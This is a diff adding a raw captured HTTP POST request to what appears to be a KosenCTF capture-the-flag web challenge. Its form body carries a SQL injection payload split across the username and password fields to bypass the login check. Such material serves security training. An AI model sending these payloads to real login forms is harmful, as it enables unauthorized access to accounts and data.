@@ -1,0 +1,15 @@
+POST / HTTP/1.1
+Host: web.kosenctf.com:10000
+Connection: keep-alive
+Content-Length: 52
+Cache-Control: max-age=0
+Origin: http://web.kosenctf.com:10000
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://web.kosenctf.com:10000/
+Accept-Encoding: gzip, deflate
+Accept-Language: ja-JP,ja;q=0.9,en-US;q=0.8,en-XA;q=0.7,en;q=0.6
+
+username=admin%27and%28not%28&password=%29%29and%271
